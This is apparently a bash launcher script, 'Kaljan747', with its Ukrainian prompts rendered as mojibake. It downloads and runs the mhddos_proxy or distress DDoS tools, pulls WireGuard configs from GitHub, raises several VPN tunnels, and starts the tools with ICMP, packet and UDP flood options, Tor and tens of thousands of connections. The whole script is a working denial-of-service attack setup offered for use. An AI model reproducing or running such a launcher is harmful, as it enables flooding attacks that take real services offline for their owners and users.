#!/bin/bash
set -e

print_header() {
    echo -e "\e[1;36m========================================"
    echo -e "üöÄ  –ó–∞–ø—É—Å–∫ Kaljan747"
    echo -e "========================================\e[0m"
}

print_stage() {
    echo -e "\e[1;34m$1\e[0m"
}

SETTINGS_FILE="$HOME/.kaljan747_settings"

ask_user_id() {
    read -p "–í–≤–µ–¥—ñ—Ç—å –≤–∞—à user-id (—Ç—ñ–ª—å–∫–∏ —Ü–∏—Ñ—Ä–∏): " USER_ID
}

ask_run_parameters() {
    echo "–°–∫—ñ–ª—å–∫–∏ —Ä–æ–±–æ—á–∏—Ö —Ç—É–Ω–µ–ª—ñ–≤ –ø–æ—Ç—Ä—ñ–±–Ω–æ –ø—ñ–¥–Ω—è—Ç–∏ (1-20)?"
    read -p "–ö—ñ–ª—å–∫—ñ—Å—Ç—å WG: " MAX_WG
    [[ "$MAX_WG" =~ ^[0-9]+$ ]] || MAX_WG=4
    [ "$MAX_WG" -lt 1 ] && MAX_WG=1
    [ "$MAX_WG" -gt 20 ] && MAX_WG=20
    echo "–í–∏–±–µ—Ä—ñ—Ç—å –º–æ–¥—É–ª—å:"
    echo "1) mhddos_proxy"
    echo "2) distress"
    read -p "–í–∞—à –≤–∏–±—ñ—Ä (1/2): " mod_choice
    SELECTED_MODULE=$( [ "$mod_choice" = "1" ] && echo "mhddos_proxy" || echo "distress" )

    echo "–†–µ–¥–∞–≥—É–≤–∞—Ç–∏ INI –ø–µ—Ä–µ–¥ –∑–∞–ø—É—Å–∫–æ–º?"
    echo "1) –¢–∞–∫"
    echo "2) –ù—ñ"
    read -p "–í–∞—à –≤–∏–±—ñ—Ä (1/2): " edit_choice
    EDIT_INI=$( [ "$edit_choice" = "1" ] && echo "–¢–∞–∫" || echo "–ù—ñ" )

    echo "–í–∏–±–µ—Ä—ñ—Ç—å —Ä–µ–∂–∏–º –∑–∞–ø—É—Å–∫—É:"
    echo "1) screen —É —Ñ–æ–Ω—ñ"
    echo "2) screen –≤—ñ–¥–∫—Ä–∏—Ç–æ"
    echo "3) –±–µ–∑ screen"
    read -p "–í–∞—à –≤–∏–±—ñ—Ä (1/2/3): " run_choice
    case "$run_choice" in
        1) SELECTED_RUN_MODE="screen —É —Ñ–æ–Ω—ñ";;
        2) SELECTED_RUN_MODE="screen –≤—ñ–¥–∫—Ä–∏—Ç–æ";;
        3) SELECTED_RUN_MODE="–±–µ–∑ screen";;
    esac
}

if [ -f "$SETTINGS_FILE" ]; then
    echo "1) –í–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —Å—Ç–∞—Ä—ñ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è"
    echo "2) –í–≤–µ—Å—Ç–∏ –Ω–æ–≤—ñ"
    read -p "–í–∞—à –≤–∏–±—ñ—Ä (1/2): " choice
    if [ "$choice" = "1" ]; then
        source "$SETTINGS_FILE"
        : "${MAX_WG:=4}"
    else
        USER_ID=""; SELECTED_MODULE=""; EDIT_INI=""; SELECTED_RUN_MODE=""
    fi
fi

[ -z "$USER_ID" ] && ask_user_id
[ -z "$SELECTED_MODULE" ] || [ -z "$EDIT_INI" ] || [ -z "$SELECTED_RUN_MODE" ] && ask_run_parameters

print_header
echo -e "üìÖ  USER-ID: \e[1;32m$USER_ID\e[0m"
echo -e "üß∞  –ú–æ–¥—É–ª—å: \e[1;36m$SELECTED_MODULE\e[0m"
echo -e "üõ†Ô∏è  –†–µ–∂–∏–º: \e[1;36m$SELECTED_RUN_MODE\e[0m"

echo "MAX_WG=\"$MAX_WG\"" > "$SETTINGS_FILE"
echo "USER_ID=\"$USER_ID\"" >> "$SETTINGS_FILE"
echo "SELECTED_MODULE=\"$SELECTED_MODULE\"" >> "$SETTINGS_FILE"
echo "EDIT_INI=\"$EDIT_INI\"" >> "$SETTINGS_FILE"
echo "SELECTED_RUN_MODE=\"$SELECTED_RUN_MODE\"" >> "$SETTINGS_FILE"

[ "$(id -u)" -eq 0 ] && SUDO="" || SUDO="sudo"

# === –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–µ –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è —à–ª—è—Ö—É –¥–æ wg_confs ===
if [ -d "$PWD/wg_confs" ]; then
  WG_DIR="$PWD/wg_confs"
elif [ -d "$HOME/wg_confs" ]; then
  WG_DIR="$HOME/wg_confs"
else
  echo "‚ùå –ù–µ –∑–Ω–∞–π–¥–µ–Ω–æ –ø–∞–ø–∫—É wg_confs. –°—Ç–≤–æ—Ä—é—é –≤ \$HOME"
  WG_DIR="$HOME/wg_confs"
  mkdir -p "$WG_DIR"
fi

echo "üìÇ –ü–æ—Ç–æ—á–Ω–∞ –ø–∞–ø–∫–∞ WG: $WG_DIR"

MODULE_DIR="$HOME/modules"
mkdir -p "$MODULE_DIR"
touch "$MODULE_DIR/mhddos.ini" "$MODULE_DIR/distress.ini"

case "$SELECTED_MODULE" in
    mhddos_proxy)
        MODULE="$MODULE_DIR/mhddos_proxy"
        CONFIG_FILE="$MODULE_DIR/mhddos.ini"
        MODULE_NAME="mhddos"
        DOWNLOAD_LINK="https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux"
        ;;
    distress)
        MODULE="$MODULE_DIR/distress"
        CONFIG_FILE="$MODULE_DIR/distress.ini"
        MODULE_NAME="distress"
        DOWNLOAD_LINK="https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl"
        ;;
esac

[ -f "$MODULE" ] || wget -qO "$MODULE" "$DOWNLOAD_LINK"
chmod +x "$MODULE"

print_stage "üåç  –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è WG-–∫–æ–Ω—Ñ—ñ–≥—ñ–≤..."

WG_REPO_HTML="https://github.com/k7771/Kaljan747/tree/k7771/wg"
WG_RAW_BASE="https://raw.githubusercontent.com/k7771/Kaljan747/k7771/wg"

CONF_LIST_GITHUB=$(curl -fsSL "$WG_REPO_HTML" | grep -oP '(?<=href=")[^"]+\.conf(?=")' | grep "/k7771/Kaljan747/blob/" | sed -E 's|^/k7771/Kaljan747/blob/k7771/wg/||')

if [ -n "$CONF_LIST_GITHUB" ]; then
    echo "üåê –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∑ GitHub:"
    for file in $CONF_LIST_GITHUB; do
        RAW_URL="$WG_RAW_BASE/$file"
        DEST="$WG_DIR/$(basename "$file")"
        if ! curl -fsSL "$RAW_URL" -o "$DEST"; then
            echo "‚ö†Ô∏è curl –Ω–µ —Å–ø—Ä–∞—Ü—é–≤–∞–≤ ‚Äî –ø—Ä–æ–±—É—é wget..."
            wget -qO "$DEST" "$RAW_URL" || echo "‚ùå –ù–µ –≤–¥–∞–ª–æ—Å—è –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ $file"
        else
            echo "‚úÖ –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ: $file"
        fi
    done
else
    echo "‚ö†Ô∏è –ù–µ –≤–¥–∞–ª–æ—Å—è –æ—Ç—Ä–∏–º–∞—Ç–∏ —Å–ø–∏—Å–æ–∫ .conf –∑ GitHub ‚Äî –ø—Ä–æ–ø—É—Å–∫–∞—î–º–æ GitHub"
fi

CONF_LIST_LOCAL=$(find "$WG_DIR" -name "*.conf" -type f)

if [ -z "$CONF_LIST_LOCAL" ]; then
    echo "‚ùå –ñ–æ–¥–Ω–æ–≥–æ .conf –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ –Ω–∞–≤—ñ—Ç—å –ª–æ–∫–∞–ª—å–Ω–æ. –ó–∞–≤–µ—Ä—à–µ–Ω–Ω—è."
    exit 1
else
    echo "üìÇ –õ–æ–∫–∞–ª—å–Ω—ñ .conf —Ñ–∞–π–ª–∏: $(basename -a $CONF_LIST_LOCAL | tr '\n' ' ')"
fi

$SUDO chmod 600 "$WG_DIR"/*.conf 2>/dev/null || true

ACTIVE_IFACES=$(wg show interfaces 2>/dev/null | xargs)

if [ -n "$ACTIVE_IFACES" ]; then
    echo -e "\nüõë –ë—É–¥–µ –∑—É–ø–∏–Ω–µ–Ω–æ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∏: $ACTIVE_IFACES"
    for iface in $ACTIVE_IFACES; do
        echo "üßπ –ó—É–ø–∏–Ω–∫–∞ —Ç–∞ –æ—á–∏—â–µ–Ω–Ω—è —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—É: $iface"
        $SUDO wg-quick down "$WG_DIR/$iface.conf" || true
        $SUDO ip link delete "$iface" || true
    done
else
    echo "‚úÖ –ê–∫—Ç–∏–≤–Ω–∏—Ö —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—ñ–≤ –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ."
fi

WG_FILES=($(find "$WG_DIR" -name "*.conf" -type f | shuf))
WG_IFACES=()
SUCCESS=0
FAIL=0

echo -e "\nüîß –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ —Ç–∞ –ø—ñ–¥–Ω—è—Ç—Ç—è WG-—ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—ñ–≤:"

for conf in "${WG_FILES[@]}"; do
    IFACE_NAME=$(basename "$conf" .conf)
    echo -e "\nüìÑ $IFACE_NAME:"

    if ! grep -q "PrivateKey" "$conf"; then echo "‚ùå –í—ñ–¥—Å—É—Ç–Ω—ñ–π PrivateKey"; ((FAIL++)); continue; fi
    if ! grep -q "Endpoint" "$conf"; then echo "‚ùå –í—ñ–¥—Å—É—Ç–Ω—ñ–π Endpoint"; ((FAIL++)); continue; fi

    if # –∑–∞–ø—É—Å–∫–∞—î–º–æ wg-quick –∑ –ø–æ–≤–Ω–∏–º —à–ª—è—Ö–æ–º
        $SUDO wg-quick up "$conf" 2> >(tee /tmp/wg_error.log >&2); then
        if $SUDO wg show "$IFACE_NAME" &>/dev/null; then
            WG_IFACES+=("$IFACE_NAME")
            echo "‚úÖ –Ü–Ω—Ç–µ—Ä—Ñ–µ–π—Å $IFACE_NAME –ø—ñ–¥–Ω—è—Ç–æ"
            $SUDO wg show "$IFACE_NAME"
            ((SUCCESS++))
            [ ${#WG_IFACES[@]} -ge $MAX_WG ] && break
        else
            echo "‚ö†Ô∏è –ù–µ–∞–∫—Ç–∏–≤–Ω–∏–π $IFACE_NAME"
            ((FAIL++))
        fi
    else
        echo "‚ùå –ü–æ–º–∏–ª–∫–∞ $IFACE_NAME:"
        cat /tmp/wg_error.log
        ((FAIL++))
    fi
    sleep 1

done

rm -f /tmp/wg_error.log

echo -e "\nüìä –†–µ–∑—É–ª—å—Ç–∞—Ç: –£—Å–ø—ñ—à–Ω–æ: $SUCCESS | –ü–æ–º–∏–ª–æ–∫: $FAIL"

[ ${#WG_IFACES[@]} -eq 0 ] && echo "‚ùå –ù—ñ—á–æ–≥–æ –Ω–µ –ø—ñ–¥–Ω—è–ª–æ—Å—å. –í–∏—Ö—ñ–¥." && exit 1

VPN_LIST=$(IFS=' '; echo "${WG_IFACES[*]}")
VPN_LIST_COMMAS=$(IFS=','; echo "${WG_IFACES[*]}")

echo "--use-my-ip 0 --copies 4 -t 12000 --ifaces $VPN_LIST --user-id=$USER_ID" > "$MODULE_DIR/mhddos.ini"
echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000 --interface=$VPN_LIST_COMMAS --user-id=$USER_ID" > "$MODULE_DIR/distress.ini"

[ "$EDIT_INI" = "–¢–∞–∫" ] && nano "$CONFIG_FILE"

case "$SELECTED_RUN_MODE" in
    "screen —É —Ñ–æ–Ω—ñ") screen -dmS "$MODULE_NAME" "$MODULE" $(cat "$CONFIG_FILE") ;;
    "screen –≤—ñ–¥–∫—Ä–∏—Ç–æ") screen -S "$MODULE_NAME" "$MODULE" $(cat "$CONFIG_FILE") ;;
    "–±–µ–∑ screen") "$MODULE" $(cat "$CONFIG_FILE") & ;;
esac

exit 0
